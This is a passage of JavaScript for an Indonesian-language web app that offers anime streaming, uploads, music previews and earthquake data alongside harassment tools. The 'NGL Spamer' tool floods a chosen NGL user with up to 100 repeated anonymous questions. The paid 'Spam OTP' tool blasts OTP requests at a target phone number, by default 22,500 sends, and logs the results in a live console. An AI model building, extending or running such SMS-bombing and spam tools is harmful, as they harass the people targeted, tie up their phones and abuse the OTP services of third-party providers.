  box.innerHTML = `<div class="anime-loading"><div class="sp"></div><span>Loading stream...</span></div>`;
  try {
    const res = await fetch(`${CONFIG.ANIME_API}?stream=${encodeURIComponent(epUrl)}`);
    const data = await res.json();
    const streamUrl = data?.data?.streamUrl;
    if (!streamUrl) throw new Error("No stream");
    box.innerHTML = `
      <div class="anime-stream">
        <div class="as-header">
          <div class="as-back" id="as-back"><i class="fa-solid fa-arrow-left"></i></div>
          <div class="as-title">${epTitle || "Episode"}</div>
        </div>
        <div class="player-wrap"><iframe src="${streamUrl}" allowfullscreen></iframe></div>
        <div style="font-size:11px;color:var(--text-dim);margin-top:12px;text-align:center">Jika video tidak muncul, coba refresh</div>
        <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>
      </div>`;
    $("#as-back").onclick = () => {
      haptic(8);
      if (State.animeCurrentDetail) {
        openAnimeDetail(State.animeCurrentDetail.url, State.animeCurrentDetail.title, State.animeCurrentDetail.image, "");
      }
    };
    if (detail) saveContinueWatching(detail, epTitle, epUrl);
  } catch (e) {
    showPlayerError(box, epUrl, epTitle);
  }
}

function showPlayerError(box, epUrl, epTitle) {
  box.innerHTML = `
    <div class="anime-stream">
      <div class="as-header">
        <div class="as-back" id="as-back"><i class="fa-solid fa-arrow-left"></i></div>
        <div class="as-title">${epTitle || "Episode"}</div>
      </div>
      <div class="player-wrap">
        <div class="player-error">
          <i class="fa-solid fa-circle-exclamation"></i>
          <div class="t">Gagal load video, coba lagi</div>
          <button class="btn btn-primary" id="btn-retry" style="max-width:200px"><i class="fa-solid fa-rotate"></i> Coba Lagi</button>
        </div>
      </div>
      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>
    </div>`;
  $("#as-back").onclick = () => {
    haptic(8);
    if (State.animeCurrentDetail) {
      openAnimeDetail(State.animeCurrentDetail.url, State.animeCurrentDetail.title, State.animeCurrentDetail.image, "");
    }
  };
  $("#btn-retry").onclick = () => {
    haptic(10);
    playAnimeEpisode(epUrl, epTitle, State.animeCurrentDetail);
  };
}

function getContinueWatching() {
  try { return JSON.parse(localStorage.getItem("bluxus_continue") || "[]"); }
  catch (e) { return []; }
}

function saveContinueWatching(detail, epTitle, epUrl) {
  try {
    let list = getContinueWatching();
    list = list.filter(x => x.link !== detail.url);
    list.unshift({
      title: cleanTitle(detail.title),
      link: detail.url,
      image: detail.image,
      type: "TV",
      latestEpisode: epTitle || "",
      episodeUrl: epUrl,
      at: Date.now()
    });
    list = list.slice(0, 10);
    localStorage.setItem("bluxus_continue", JSON.stringify(list));
  } catch (e) {}
}

function initAnimeEvents() {
  $("#btn-anime-search").onclick = () => {
    haptic(8);
    $("#anime-search-inline").classList.add("show");
    $("#anime-search-input").focus();
  };
  $("#btn-anime-search-close").onclick = () => {
    haptic(8);
    $("#anime-search-inline").classList.remove("show");
    $("#anime-search-input").value = "";
    if (State.animeSearchMode) {
      State.animeSearchMode = false;
      loadAnimeRows();
    }
  };
  $("#anime-search-input").addEventListener("keydown", e => {
    if (e.key === "Enter") searchAnime(e.target.value);
  });
}

// ============================================================
// TOOLS
// ============================================================
const TOOLS = [
  { id: "tolink", name: "To Link", desc: "Upload foto/video → URL", icon: "fa-link" },
  { id: "spotify", name: "Spotify Preview", desc: "Cari & preview lagu", icon: "fa-music" },
  { id: "gempa", name: "Info Gempa", desc: "Data gempa dari BMKG", icon: "fa-mountain-sun" },
  { id: "ngl", name: "NGL Spamer", desc: "Spam pertanyaan NGL", icon: "fa-comment-dots" },
  { id: "qr", name: "URL to QR", desc: "Ubah URL jadi QR code", icon: "fa-qrcode" }
];

const VIP_TOOLS = [
  { id: "otp", name: "Spam OTP", desc: "Blast OTP ke nomor", icon: "fa-bolt" }
];

function goTools() {
  showScreen("tools");
  const g = $("#tools-grid");
  const vg = $("#vip-tools-grid");
  g.innerHTML = TOOLS.map(t => `
    <div class="tool-card" data-tool="${t.id}">
      <div class="tc-icon"><i class="fa-solid ${t.icon}"></i></div>
      <div class="tc-name">${t.name}</div>
      <div class="tc-desc">${t.desc}</div>
    </div>`).join("");
  const vip = isVIP();
  vg.innerHTML = VIP_TOOLS.map(t => `
    <div class="tool-card vip ${vip ? "" : "locked"}" data-tool="${t.id}">
      <div class="tc-badge vip-badge">VIP</div>
      <div class="tc-icon"><i class="fa-solid ${t.icon}"></i></div>
      <div class="tc-name">${t.name}</div>
      <div class="tc-desc">${t.desc}</div>
    </div>`).join("");
  $$(".tool-card").forEach(el => el.onclick = () => {
    haptic(10);
    openTool(el.dataset.tool, el.classList.contains("locked"));
  });
}

function openTool(id, locked) {
  if (locked) return toast("Butuh akses VIP", "warn");
  if (id === "tolink") return toolToLink();
  if (id === "spotify") return toolSpotify();
  if (id === "gempa") return toolGempa();
  if (id === "ngl") return toolNGL();
  if (id === "qr") return toolQR();
  if (id === "otp") return toolOTP();
}

// ============================================================
// TOOL: TO LINK
// ============================================================
function toolToLink() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>To Link</h3><div class="sub">Upload foto/video, dapet URL-nya</div>
    <div class="upload-zone" id="upload-zone">
      <input type="file" id="upload-input" accept="image/*,video/*">
      <div class="uz-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div>
      <div class="uz-title">Tap untuk pilih file</div>
      <div class="uz-desc">Max 2 MB</div>
    </div>
    <div class="upload-progress" id="upload-progress">
      <div class="up-bar"><div class="up-fill" id="up-fill"></div></div>
      <div class="up-text" id="up-text">Mengunggah... 0%</div>
    </div>
    <div class="upload-result" id="upload-result">
      <div class="ur-head"><div class="ico-badge"><i class="fa-solid fa-circle-check"></i></div><div class="t">Upload Berhasil</div></div>
      <div class="ur-row"><span class="l">URL</span><span class="v" id="ur-url">—</span></div>
      <div class="ur-row"><span class="l">Size</span><span class="v" id="ur-size">—</span></div>
      <div class="ur-row"><span class="l">Created</span><span class="v" id="ur-created">—</span></div>
      <div class="ur-row"><span class="l">API by</span><span class="v">Termai</span></div>
      <div class="ur-actions">
        <button class="btn btn-ghost" id="btn-copy-url"><i class="fa-solid fa-copy"></i> Copy</button>
        <button class="btn btn-primary" id="btn-open-url"><i class="fa-solid fa-arrow-up-right-from-square"></i> Buka</button>
      </div>
    </div>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  $("#upload-input").onchange = () => {
    const f = $("#upload-input").files[0];
    if (f) handleUpload(f);
  };
}

async function handleUpload(file) {
  if (file.size > CONFIG.MAX_UPLOAD) return toast("File max 2 MB", "err");
  const ext = file.name.split(".").pop().toLowerCase();
  if (!["jpg", "jpeg", "png", "gif", "webp", "mp4", "webm"].includes(ext)) return toast("Format tidak didukung", "err");
  $("#upload-progress").classList.add("show");
  $("#upload-result").classList.remove("show");
  $("#up-fill").style.width = "0%";
  const fd = new FormData();
  fd.append("file", file, file.name);
  const xhr = new XMLHttpRequest();
  xhr.open("POST", `${CONFIG.TERMAI_URL}/api/upload?key=${CONFIG.TERMAI_KEY}`);
  xhr.upload.onprogress = (e) => {
    if (e.lengthComputable) {
      const p = Math.round(e.loaded / e.total * 100);
      $("#up-fill").style.width = p + "%";
      $("#up-text").textContent = `Mengunggah... ${p}%`;
    }
  };
  xhr.onload = () => {
    try {
      const r = JSON.parse(xhr.responseText);
      if (r.status && r.path) {
        $("#up-fill").style.width = "100%";
        $("#up-text").textContent = "Selesai!";
        setTimeout(() => {
          $("#upload-progress").classList.remove("show");
          $("#ur-url").textContent = r.path;
          $("#ur-size").textContent = fmtSize(r.size);
          $("#ur-created").textContent = fmtDateTime(Date.now());
          $("#upload-result").classList.add("show");
          $("#btn-copy-url").onclick = async () => {
            haptic(10);
            const ok = await copyToClipboard(r.path);
            toast(ok ? "URL di-copy" : "Gagal copy", ok ? "ok" : "err");
          };
          $("#btn-open-url").onclick = () => {
            haptic(10);
            window.open(r.path, "_blank");
          };
        }, 400);
      } else {
        toast("Upload gagal", "err");
        $("#upload-progress").classList.remove("show");
      }
    } catch (e) {
      toast("Upload gagal", "err");
      $("#upload-progress").classList.remove("show");
    }
  };
  xhr.onerror = () => {
    toast("Koneksi error", "err");
    $("#upload-progress").classList.remove("show");
  };
  xhr.send(fd);
}

// ============================================================
// TOOL: SPOTIFY
// ============================================================
function toolSpotify() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>Spotify Preview</h3><div class="sub">Cari lagu & preview 30 detik</div>
    <div class="field">
      <div class="input-wrap">
        <div class="ico-badge"><i class="fa-solid fa-search"></i></div>
        <input type="text" id="sp-q" placeholder="Cari lagu...">
      </div>
    </div>
    <button class="btn btn-primary" id="sp-search"><i class="fa-solid fa-search"></i> Cari</button>
    <div id="sp-results" class="spotify-list"></div>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  $("#sp-search").onclick = doSpotifySearch;
  $("#sp-q").addEventListener("keydown", e => { if (e.key === "Enter") doSpotifySearch(); });
}

async function doSpotifySearch() {
  const q = $("#sp-q").value.trim();
  if (!q) return toast("Isi query", "err");
  const btn = $("#sp-search");
  btn.disabled = true;
  btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
  try {
    const res = await fetch(`${CONFIG.FAZZ_API}/spotify?q=${encodeURIComponent(q)}&api_key=${CONFIG.FAZZ_KEY}`);
    const data = await res.json();
    if (data.status !== "success" || !data.result) {
      $("#sp-results").innerHTML = '<div style="text-align:center;color:var(--text-mute);padding:20px;font-size:12px">Lagu tidak ditemukan</div>';
      return;
    }
    $("#sp-results").innerHTML = data.result.map((t, i) => `
      <div class="spotify-item" data-idx="${i}">
        <img class="sp-cover" src="${t.thumb}" onerror="this.style.background='var(--bg-card)'">
        <div class="sp-info">
          <div class="t">${t.title}</div>
          <div class="a">${t.artist}</div>
          <div class="d">${t.duration}</div>
        </div>
        <div class="sp-play"><i class="fa-solid fa-play"></i></div>
      </div>`).join("");
    $$(".spotify-item").forEach(el => {
      el.onclick = () => {
        haptic(10);
        const t = data.result[parseInt(el.dataset.idx)];
        playTrack(t);
      };
    });
  } catch (e) {
    toast("Gagal cari lagu", "err");
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fa-solid fa-search"></i> Cari';
  }
}

function playTrack(t) {
  if (!t.preview) return toast("Preview tidak tersedia", "warn");
  if (State.audio) { State.audio.pause(); State.audio = null; }
  State.currentTrack = t;
  const audio = new Audio(t.preview);
  State.audio = audio;
  $("#pb-cover").src = t.thumb;
  $("#pb-title").textContent = t.title;
  $("#pb-artist").textContent = t.artist;
  $("#player-bar").classList.add("show");
  audio.play();
  $("#pb-toggle-icon").className = "fa-solid fa-pause";
  audio.ontimeupdate = () => {
    const p = (audio.currentTime / audio.duration) * 100;
    $("#pb-progress").style.width = p + "%";
  };
  audio.onended = () => { $("#pb-toggle-icon").className = "fa-solid fa-play"; };
  audio.onerror = () => { toast("Gagal memutar preview", "err"); };
}

function initPlayer() {
  $("#pb-toggle").onclick = () => {
    haptic(10);
    if (!State.audio) return;
    if (State.audio.paused) {
      State.audio.play();
      $("#pb-toggle-icon").className = "fa-solid fa-pause";
    } else {
      State.audio.pause();
      $("#pb-toggle-icon").className = "fa-solid fa-play";
    }
  };
  $("#pb-close").onclick = () => {
    haptic(10);
    if (State.audio) { State.audio.pause(); State.audio = null; }
    $("#player-bar").classList.remove("show");
  };
}

// ============================================================
// TOOL: GEMPA
// ============================================================
function toolGempa() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>Info Gempa</h3><div class="sub">Data gempa terkini dari BMKG</div>
    <div id="gempa-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>
    <button class="btn btn-ghost" id="gempa-refresh" style="margin-top:14px"><i class="fa-solid fa-rotate"></i> Refresh</button>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  loadGempa();
  $("#gempa-refresh").onclick = () => { haptic(10); loadGempa(); };
}

async function loadGempa() {
  const box = $("#gempa-content");
  if (!box) return;
  try {
    const res = await fetch(`${CONFIG.FAZZ_API}/gempa?api_key=${CONFIG.FAZZ_KEY}`);
    const data = await res.json();
    if (data.status !== "success" || !data.result) {
      box.innerHTML = '<div style="color:var(--error);font-size:12px;text-align:center">Gagal load</div>';
      return;
    }
    const r = data.result;
    const mag = parseFloat(r.magnitude) || 0;
    let cls = "";
    if (mag >= 6) cls = "critical";
    else if (mag >= 5) cls = "danger";
    else if (mag >= 3) cls = "warn";
    box.innerHTML = `
      <div class="gempa-card">
        <div class="gempa-mag ${cls}">
          <div class="m-value">${r.magnitude}</div>
          <div class="m-label">Magnitudo</div>
        </div>
        <div class="gempa-detail">
          <div class="gempa-row"><div class="icon"><i class="fa-solid fa-location-dot"></i></div><div class="info"><div class="l">Wilayah</div><div class="v">${r.wilayah || "—"}</div></div></div>
          <div class="gempa-row"><div class="icon"><i class="fa-solid fa-clock"></i></div><div class="info"><div class="l">Waktu</div><div class="v">${r.tanggal || "—"}, ${r.jam || "—"}</div></div></div>
          <div class="gempa-row"><div class="icon"><i class="fa-solid fa-arrow-down"></i></div><div class="info"><div class="l">Kedalaman</div><div class="v">${r.kedalaman || "—"}</div></div></div>
          <div class="gempa-row"><div class="icon"><i class="fa-solid fa-compass"></i></div><div class="info"><div class="l">Koordinat</div><div class="v">${r.lintang || ""} ${r.bujur || ""}</div></div></div>
          <div class="gempa-row"><div class="icon"><i class="fa-solid fa-triangle-exclamation"></i></div><div class="info"><div class="l">Potensi</div><div class="v">${r.potensi || "—"}</div></div></div>
          <div class="gempa-row"><div class="icon"><i class="fa-solid fa-bolt"></i></div><div class="info"><div class="l">Dirasakan</div><div class="v">${r.dirasakan || "—"}</div></div></div>
        </div>
        ${r.shakemap_url ? `<div class="gempa-shakemap"><div class="lbl">Shakemap</div><img src="${r.shakemap_url}" onclick="window.open('${r.shakemap_url}','_blank')" onerror="this.style.display='none'"></div>` : ""}
      </div>`;
  } catch (e) {
    box.innerHTML = '<div style="color:var(--error);font-size:12px;text-align:center">Gagal load</div>';
  }
}

// ============================================================
// TOOL: NGL
// ============================================================
function toolNGL() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>NGL Spamer</h3><div class="sub">Kirim pertanyaan anonim ke NGL</div>
    <div class="field">
      <label>Username NGL</label>
      <div class="input-wrap">
        <div class="ico-badge"><i class="fa-solid fa-at"></i></div>
        <input type="text" id="ngl-user" placeholder="username">
      </div>
    </div>
    <div class="field">
      <label>Pertanyaan</label>
      <div class="input-wrap">
        <div class="ico-badge"><i class="fa-solid fa-comment"></i></div>
        <textarea id="ngl-q" placeholder="Tulis pertanyaan..."></textarea>
      </div>
    </div>
    <div class="field">
      <label>Limit: <span id="ngl-limit-val">10</span></label>
      <input type="range" id="ngl-limit" min="1" max="100" value="10" style="width:100%">
    </div>
    <div class="ngl-preview" id="ngl-preview">
      <div class="lbl">Preview</div>
      <div class="val" id="ngl-pv-q">—</div>
      <div class="to">to: <b id="ngl-pv-user">—</b></div>
    </div>
    <button class="btn btn-primary" id="ngl-send" style="margin-top:14px"><i class="fa-solid fa-paper-plane"></i> Kirim</button>
    <div id="ngl-result"></div>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  $("#ngl-limit").oninput = () => { $("#ngl-limit-val").textContent = $("#ngl-limit").value; };
  $("#ngl-user").oninput = () => { $("#ngl-pv-user").textContent = $("#ngl-user").value || "—"; };
  $("#ngl-q").oninput = () => { $("#ngl-pv-q").textContent = $("#ngl-q").value || "—"; };
  $("#ngl-send").onclick = async () => {
    const user = $("#ngl-user").value.trim();
    const q = $("#ngl-q").value.trim();
    const limit = parseInt($("#ngl-limit").value);
    if (!user || !q) return toast("Isi username & pertanyaan", "err");
    const btn = $("#ngl-send");
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sending...';
    try {
      const res = await fetch(`${CONFIG.FAZZ_API}/ngl?username=${encodeURIComponent(user)}&question=${encodeURIComponent(q)}&limit=${limit}&api_key=${CONFIG.FAZZ_KEY}`);
      const data = await res.json();
      if (data.status === "success" && data.result) {
        $("#ngl-result").innerHTML = `
          <div class="stat-row" style="margin-top:14px">
            <div class="stat-box success"><div class="l"><i class="fa-solid fa-check"></i> Sukses</div><div class="v">${data.result.sent || 0}</div></div>
            <div class="stat-box fail"><div class="l"><i class="fa-solid fa-xmark"></i> Gagal</div><div class="v">${data.result.failed || 0}</div></div>
            <div class="stat-box total"><div class="l"><i class="fa-solid fa-list"></i> Total</div><div class="v">${limit}</div></div>
          </div>`;
        toast("Terkirim!", "ok");
      } else {
        toast(data.message || "Gagal", "err");
      }
    } catch (e) {
      toast("Koneksi error", "err");
    } finally {
      btn.disabled = false;
      btn.innerHTML = '<i class="fa-solid fa-paper-plane"></i> Kirim';
    }
  };
}

// ============================================================
// TOOL: QR
// ============================================================
function toolQR() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>URL to QR</h3><div class="sub">Ubah URL jadi QR code</div>
    <div class="field">
      <div class="input-wrap">
        <div class="ico-badge"><i class="fa-solid fa-link"></i></div>
        <input type="text" id="qr-url" placeholder="https://example.com">
      </div>
    </div>
    <button class="btn btn-primary" id="qr-gen"><i class="fa-solid fa-qrcode"></i> Generate</button>
    <div id="qr-result"></div>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  $("#qr-gen").onclick = async () => {
    const url = $("#qr-url").value.trim();
    if (!url) return toast("Isi URL", "err");
    const btn = $("#qr-gen");
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
    try {
      const res = await fetch(`${CONFIG.FAZZ_API}/qr?url=${encodeURIComponent(url)}&api_key=${CONFIG.FAZZ_KEY}`);
      const data = await res.json();
      if (data.status === "success" && data.result?.qr_image) {
        $("#qr-result").innerHTML = `
          <div class="qr-result">
            <img src="${data.result.qr_image}" alt="QR">
            <div class="qr-url">${url}</div>
            <button class="btn btn-ghost" id="qr-copy"><i class="fa-solid fa-copy"></i> Copy URL</button>
          </div>`;
        $("#qr-copy").onclick = async () => {
          haptic(10);
          const ok = await copyToClipboard(url);
          toast(ok ? "URL di-copy" : "Gagal copy", ok ? "ok" : "err");
        };
      } else {
        toast("Gagal generate QR", "err");
      }
    } catch (e) {
      toast("Koneksi error", "err");
    } finally {
      btn.disabled = false;
      btn.innerHTML = '<i class="fa-solid fa-qrcode"></i> Generate';
    }
  };
}

// ============================================================
// TOOL: SPAM OTP
// ============================================================
function toolOTP() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3 style="color:var(--vip)">Spam OTP</h3><div class="sub">Blast OTP ke nomor target (VIP)</div>
    <div class="field">
      <label>Nomor Target</label>
      <div class="input-wrap">
        <div class="ico-badge" style="background:var(--vip-soft)"><i class="fa-solid fa-phone" style="color:var(--vip)"></i></div>
        <input type="tel" id="otp-phone" placeholder="628xxxxxxxxxx">
      </div>
    </div>
    <div class="rondes-box">
      <div class="rb-head">
        <div class="t"><i class="fa-solid fa-repeat" style="color:var(--vip)"></i> PENGULANGAN</div>
        <div class="badge" id="otp-total">= 22500 KIRIMAN</div>
      </div>
      <div class="rondes-input">
        <div class="rb-btn" id="otp-minus">−</div>
        <div class="rb-val" id="otp-rondes">900</div>
        <div class="rb-x">×</div>
        <div class="rb-val" id="otp-mult" style="flex:0.7">25</div>
        <div class="rb-btn" id="otp-plus">+</div>
      </div>
      <div class="multiplier-grid" id="otp-multipliers">
        <div class="m-btn" data-m="1">1x</div>
        <div class="m-btn" data-m="2">2x</div>
        <div class="m-btn" data-m="3">3x</div>
        <div class="m-btn" data-m="5">5x</div>
        <div class="m-btn" data-m="10">10x</div>
        <div class="m-btn active" data-m="25">25x</div>
      </div>
      <div class="rondes-info">Setiap ronde mengirim ke semua provider</div>
    </div>
    <div class="spam-actions">
      <button class="btn-start" id="otp-start"><i class="fa-solid fa-play"></i> <span>START</span></button>
      <button class="btn-reset" id="otp-reset"><i class="fa-solid fa-rotate-left"></i></button>
    </div>
    <div class="progress-card">
      <div class="pc-head">
        <div class="icon-wrap"><i class="fa-solid fa-rotate"></i></div>
        <div class="info">
          <div class="l">PROGRES</div>
          <div class="v" id="otp-progress-text">idle</div>
        </div>
        <div class="pct" id="otp-pct">0%</div>
      </div>
      <div class="progress-bar"><div class="fill" id="otp-fill"></div></div>
      <div class="stat-row">
        <div class="stat-box success"><div class="l"><i class="fa-solid fa-check"></i> SUKSES</div><div class="v" id="otp-succ">0</div></div>
        <div class="stat-box fail"><div class="l"><i class="fa-solid fa-xmark"></i> GAGAL</div><div class="v" id="otp-fail">0</div></div>
        <div class="stat-box total"><div class="l"><i class="fa-solid fa-list"></i> TOTAL</div><div class="v" id="otp-total-count">0</div></div>
      </div>
    </div>
    <div style="font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px">
      <i class="fa-solid fa-terminal" style="color:var(--vip)"></i> LIVE CONSOLE
    </div>
    <div class="console-box" id="otp-console"></div>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  initOTP();
}

function initOTP() {
  const state = { rondes: 900, mult: 25, current: 0, running: false, success: 0, fail: 0, stopFlag: false };
  const upd = () => {
    $("#otp-rondes").textContent = state.rondes;
    $("#otp-mult").textContent = state.mult;
    const total = state.rondes * state.mult;
    $("#otp-total").textContent = `= ${total} KIRIMAN`;
    $("#otp-total-count").textContent = `${state.success + state.fail}/${total}`;
  };
  $("#otp-minus").onclick = () => { haptic(5); if (state.rondes > 1) { state.rondes--; upd(); } };
  $("#otp-plus").onclick = () => { haptic(5); if (state.rondes < 999) { state.rondes++; upd(); } };
  $$("#otp-multipliers .m-btn").forEach(b => {
    b.onclick = () => {
      haptic(5);
      $$("#otp-multipliers .m-btn").forEach(x => x.classList.remove("active"));
      b.classList.add("active");
      state.mult = parseInt(b.dataset.m);
      upd();
    };
  });
  $("#otp-reset").onclick = () => {
    haptic(10);
    state.current = 0; state.success = 0; state.fail = 0;
    state.stopFlag = true;
    setTimeout(() => state.stopFlag = false, 100);
    upd();
    $("#otp-console").innerHTML = "";
    $("#otp-fill").style.width = "0%";
    $("#otp-pct").textContent = "0%";
  };
  $("#otp-start").onclick = async () => {
    const phone = $("#otp-phone").value.trim();
    if (!phone) return toast("Isi nomor target", "err");
    haptic(20);
    if (state.running) { state.stopFlag = true; return; }
    state.running = true;
    state.stopFlag = false;
    $("#otp-start").classList.add("stop");
    $("#otp-start").innerHTML = `<i class="fa-solid fa-stop"></i> <span>STOP</span>`;
    addConsole("info", `Mulai spam ke ${phone}...`);
    for (let r = state.current; r < state.rondes; r++) {
      if (state.stopFlag) break;
      state.current = r;
      await spamOneRound(phone, state);
      upd();
    }
    state.running = false;
    $("#otp-start").classList.remove("stop");
    $("#otp-start").innerHTML = `<i class="fa-solid fa-play"></i> <span>START</span>`;
    addConsole("info", "Selesai.");
  };
  upd();
}

async function spamOneRound(phone, state) {
  try {
    const res = await fetch(`${CONFIG.FAZZ_API}/otpblast?phone=${phone}&api_key=${CONFIG.FAZZ_KEY}`);
    const data = await res.json();
    if (data.status === "success" || data.result) {
      const details = data.details || data.result?.details || [];
      for (let i = 0; i < state.mult; i++) {
        if (details.length > 0) {
          const d = details[Math.floor(Math.random() * details.length)];
          if (d.success) { state.success++; addConsole("sent", `${d.name || "Provider"} ✓`); }
          else { state.fail++; addConsole("fail", `${d.name || "Provider"} ✗`); }
        } else {
          if (data.success) { state.success++; addConsole("sent", "Provider ✓"); }
          else { state.fail++; addConsole("fail", "Provider ✗"); }
        }
      }
    }
  } catch (e) {
    addConsole("fail", "Network error");
  }
  const total = state.rondes * state.mult;
  const done = state.success + state.fail;
  const pct = Math.min(100, Math.round(done / total * 100));
  $("#otp-fill").style.width = pct + "%";
  $("#otp-pct").textContent = pct + "%";
  $("#otp-succ").textContent = state.success;
  $("#otp-fail").textContent = state.fail;
  $("#otp-total-count").textContent = `${done}/${total}`;
  $("#otp-progress-text").textContent = `Ronde ${state.current + 1}/${state.rondes}`;
}

function addConsole(type, msg) {
  const box = $("#otp-console");
  if (!box) return;
  const line = document.createElement("div");
  line.className = "console-line";
  const badge = type === "sent" ? "SENT" : type === "fail" ? "FAIL" : "INFO";
  line.innerHTML = `<span class="console-ts">[${fmtTime(Date.now())}]</span><span class="console-badge ${type}">${badge}</span><span class="console-msg">${msg}</span>`;
  box.appendChild(line);
  box.scrollTop = box.scrollHeight;
  while (box.children.length > 100) box.removeChild(box.firstChild);
}

// ============================================================
// ACCOUNT
// ============================================================
function goAccount() {
  showScreen("account");
  const u = State.user || {};
  $("#acc-usn").textContent = u.username || "—";
  const r = $("#acc-role");
  const role = u.role || "member";
  r.textContent = role;
  r.className = "urole " + (role === "vip" ? "vip" : role === "reseller" ? "reseller" : role === "owner" ? "owner" : "");
  $("#acc-usercode").textContent = u.userCode || "—";
  $("#acc-created").textContent = u.createdAt ? fmtDate(u.createdAt) : "—";
  if (u.avatar) $("#acc-avatar").src = u.avatar;
}

// ============================================================
// PANEL
// ============================================================
function goPanel() {
  const u = State.user || {};
  const role = u.role || "member";
  showScreen("panel");
  $("#panel-title").textContent = `${role.charAt(0).toUpperCase() + role.slice(1)} Panel`;
  $("#panel-role-text").textContent = `${role.toUpperCase()} PANEL`;
  const items = {
    owner: [
      ["fa-user-plus", "Add User"],
      ["fa-users-gear", "Manage User"],
      ["fa-ban", "Ban User"],
      ["fa-key", "Reset Password"],
      ["fa-bullhorn", "Broadcast"],
      ["fa-chart-line", "Statistics"],
      ["fa-database", "Database"]
    ],
    reseller: [
      ["fa-user-plus", "Add Member"],
      ["fa-users-gear", "Manage Member"],
      ["fa-clock-rotate-left", "Extend Member"]
    ],
    vip: [],
    member: []
  };
  const arr = items[role] || [];
  if (arr.length === 0) {
    $("#panel-grid").innerHTML = '<div style="text-align:center;color:var(--text-mute);font-size:12px;padding:20px;grid-column:1/-1">Belum ada fitur panel untuk role ini</div>';
    return;
  }
  $("#panel-grid").innerHTML = arr.map(([ic, txt]) => `
    <div class="panel-action" data-action="${txt}">
      <div class="ico-badge"><i class="fa-solid ${ic}"></i></div>
      <div class="txt">${txt}</div>
    </div>`).join("");
  $$(".panel-action").forEach(el => el.onclick = () => {
    haptic(10);
    openPanelAction(el.dataset.action);
  });
}

function openPanelAction(action) {
  const box = $("#modal-box");
  const forms = {
    "Add User": `
      <div class="field"><label>Username</label><input id="f-usn" placeholder="username"></div>
      <div class="field"><label>Password</label><input type="password" id="f-pw" placeholder="min 6 karakter"></div>
      <div class="field"><label>Role</label><select id="f-role"><option value="member">Member</option><option value="vip">VIP</option><option value="reseller">Reseller</option></select></div>
      <div class="field"><label>Masa Aktif</label><select id="f-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option><option value="">Unlimited</option></select></div>
      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-plus"></i> Buat Akun</button>`,
    "Add Member": `
      <div class="field"><label>Username</label><input id="f-usn" placeholder="username"></div>
      <div class="field"><label>Password</label><input type="password" id="f-pw" placeholder="min 6 karakter"></div>
      <div class="field"><label>Masa Aktif</label><select id="f-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option></select></div>
      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-plus"></i> Buat</button>`,
    "Manage User": `
      <div class="field"><label>Cari</label><input id="f-search" placeholder="username..."></div>
      <div id="user-list"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div></div>`,
    "Manage Member": `
      <div class="field"><label>Cari</label><input id="f-search" placeholder="username..."></div>
      <div id="user-list"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div></div>`,
    "Ban User": `
      <div class="field"><label>Username</label><input id="f-ban-usn" placeholder="username"></div>
      <button class="btn btn-danger" id="btn-submit-action"><i class="fa-solid fa-ban"></i> Ban</button>`,
    "Reset Password": `
      <div class="field"><label>Username</label><input id="f-reset-usn" placeholder="username"></div>
      <div class="field"><label>Password Baru</label><input type="password" id="f-reset-pw"></div>
      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-key"></i> Reset</button>`,
    "Broadcast": `
      <div class="field"><label>Judul</label><input id="f-bc-title"></div>
      <div class="field"><label>Pesan</label><textarea id="f-bc-msg"></textarea></div>
      <div class="field"><label>Gambar URL</label><input id="f-bc-img" placeholder="https://..."></div>
      <div class="field"><label>Link URL</label><input id="f-bc-url" placeholder="https://..."></div>
      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-bullhorn"></i> Kirim</button>`,
    "Statistics": `<div id="stat-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>`,
    "Database": `<div id="db-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>`,
    "Extend Member": `
      <div class="field"><label>Username</label><input id="f-ext-usn"></div>
      <div class="field"><label>Tambah Hari</label><select id="f-ext-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option></select></div>
      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-clock-rotate-left"></i> Perpanjang</button>`
  };
